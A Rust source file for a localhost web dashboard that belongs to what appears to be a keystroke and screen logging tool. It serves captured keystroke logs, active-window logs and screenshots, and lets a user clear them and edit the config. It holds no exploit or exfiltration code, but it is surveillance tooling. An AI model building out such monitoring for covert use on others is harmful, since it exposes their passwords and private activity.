use crate::config::Config;
use actix_files::Files;
use actix_web::{web, App, HttpResponse, HttpServer, Responder};
use std::fs::{self, File};
use std::io::{self, BufRead};
use std::path::Path;
use std::sync::Arc;

#[derive(serde::Serialize)]
struct ScreenshotEntry {
    name: String,
    url: String,
}

#[derive(serde::Serialize)]
struct LogEntry {
    timestamp: String,
    window: Option<String>,
    input: Option<String>,
    title: Option<String>,
}

async fn get_key_logs(config: web::Data<Arc<Config>>) -> impl Responder {
    let path = config.full_key_log_path();
    read_logs(&path)
}

async fn get_window_logs(config: web::Data<Arc<Config>>) -> impl Responder {
    let path = config.active_window_log_path();
    read_logs(&path)
}

fn read_logs(path: &Path) -> HttpResponse {
    let file = match File::open(path) {
        Ok(f) => f,
        Err(_) => return HttpResponse::Ok().json(Vec::<LogEntry>::new()),
    };

    let reader = io::BufReader::new(file);
    let logs: Vec<serde_json::Value> = reader
        .lines()
        .filter_map(|line| line.ok())
        .filter_map(|line| serde_json::from_str(&line).ok())
        .collect();

    HttpResponse::Ok().json(logs)
}

async fn get_screenshots(config: web::Data<Arc<Config>>) -> impl Responder {
    let dir = config.log_directory_path().join("screenshots");
    let mut screenshots = Vec::new();

    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            if let Ok(file_type) = entry.file_type() {
                if file_type.is_file() {
                    if let Some(name) = entry.file_name().to_str() {
                        screenshots.push(ScreenshotEntry {
                            name: name.to_string(),
                            url: format!("/screenshots/{}", name),
                        });
                    }
                }
            }
        }
    }

    // Sort by name (timestamp usually) descending
    screenshots.sort_by(|a, b| b.name.cmp(&a.name));

    HttpResponse::Ok().json(screenshots)
}

async fn index() -> impl Responder {
    let html = include_str!("../assets/index.html");
    HttpResponse::Ok().content_type("text/html").body(html)
}

async fn get_config(config: web::Data<Arc<Config>>) -> impl Responder {
    HttpResponse::Ok().json(config.as_ref())
}

async fn update_config(
    new_config: web::Json<Config>,
    _current_config: web::Data<Arc<Config>>,
) -> impl Responder {
    // In a real app, we might want to reload the running config,
    // but for now we just save it to disk so it applies on next restart.
    // Or we could use a RwLock for Config to allow runtime updates.
    // Given the architecture (Arc<Config>), runtime updates are hard without interior mutability.
    // So we'll save to file and tell user to restart.

    // We need the path. Hardcoded to "config.json" for now as per main.rs
    if let Err(e) = new_config.save("config.json") {
        return HttpResponse::InternalServerError().body(format!("Failed to save config: {}", e));
    }

    HttpResponse::Ok().json(serde_json::json!({
        "status": "success",
        "message": "Configuration saved. Please restart the application for changes to take effect."
    }))
}

async fn clear_key_logs(config: web::Data<Arc<Config>>) -> impl Responder {
    let path = config.full_key_log_path();
    match fs::write(&path, "") {
        Ok(_) => HttpResponse::Ok()
            .json(serde_json::json!({"status": "success", "message": "Key logs cleared"})),
        Err(e) => {
            HttpResponse::InternalServerError().body(format!("Failed to clear key logs: {}", e))
        }
    }
}

async fn clear_window_logs(config: web::Data<Arc<Config>>) -> impl Responder {
    let path = config.active_window_log_path();
    match fs::write(&path, "") {
        Ok(_) => HttpResponse::Ok()
            .json(serde_json::json!({"status": "success", "message": "Window logs cleared"})),
        Err(e) => {
            HttpResponse::InternalServerError().body(format!("Failed to clear window logs: {}", e))
        }
    }
}

async fn clear_screenshots(config: web::Data<Arc<Config>>) -> impl Responder {
    let dir = config.log_directory_path().join("screenshots");
    let mut count = 0;

    if let Ok(entries) = fs::read_dir(&dir) {
        for entry in entries.flatten() {
            if let Ok(file_type) = entry.file_type() {
                if file_type.is_file() {
                    if fs::remove_file(entry.path()).is_ok() {
                        count += 1;
                    }
                }
            }
        }
    }

    HttpResponse::Ok().json(serde_json::json!({
        "status": "success",
        "message": format!("Cleared {} screenshots", count),
        "count": count
    }))
}

async fn get_stats(config: web::Data<Arc<Config>>) -> impl Responder {
    let key_log_path = config.full_key_log_path();
    let window_log_path = config.active_window_log_path();
    let screenshot_dir = config.log_directory_path().join("screenshots");

    let key_count = count_lines(&key_log_path);
    let window_count = count_lines(&window_log_path);
    let screenshot_count = count_files(&screenshot_dir);
    let disk_usage = calculate_disk_usage(&config.log_directory_path());

    HttpResponse::Ok().json(serde_json::json!({
        "key_logs": key_count,
        "window_logs": window_count,
        "screenshots": screenshot_count,
        "disk_usage_mb": disk_usage
    }))
}

fn count_lines(path: &std::path::Path) -> usize {
    File::open(path)
        .and_then(|f| Ok(io::BufReader::new(f).lines().count()))
        .unwrap_or(0)
}

fn count_files(dir: &std::path::Path) -> usize {
    fs::read_dir(dir)
        .map(|entries| {
            entries
                .filter_map(Result::ok)
                .filter(|e| e.file_type().map(|t| t.is_file()).unwrap_or(false))
                .count()
        })
        .unwrap_or(0)
}

fn calculate_disk_usage(dir: &std::path::Path) -> f64 {
    let mut total_bytes = 0u64;

    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            if let Ok(metadata) = entry.metadata() {
                total_bytes += metadata.len();
            }

            if let Ok(file_type) = entry.file_type() {
                if file_type.is_dir() {
                    total_bytes += (calculate_disk_usage(&entry.path()) * 1_000_000.0) as u64;
                }
            }
        }
    }

    total_bytes as f64 / 1_000_000.0 // Convert to MB
}

pub async fn start_server(config: Config) -> std::io::Result<()> {
    let port = config.server_port();
    let config = Arc::new(config);
    let config_data = web::Data::new(config.clone());
    let screenshot_dir = config.log_directory_path().join("screenshots");

    println!("Starting web dashboard at http://localhost:{}", port);

    HttpServer::new(move || {
        App::new()
            .app_data(config_data.clone())
            .route("/", web::get().to(index))
            .route("/api/logs/keys", web::get().to(get_key_logs))
            .route("/api/logs/windows", web::get().to(get_window_logs))
            .route("/api/screenshots", web::get().to(get_screenshots))
            .route("/api/config", web::get().to(get_config))
            .route("/api/config", web::post().to(update_config))
            .route("/api/logs/keys", web::delete().to(clear_key_logs))
            .route("/api/logs/windows", web::delete().to(clear_window_logs))
            .route("/api/screenshots", web::delete().to(clear_screenshots))
            .route("/api/stats", web::get().to(get_stats))
            .service(Files::new("/screenshots", &screenshot_dir))
    })
    .bind(("127.0.0.1", port))?
    .run()
    .await
}
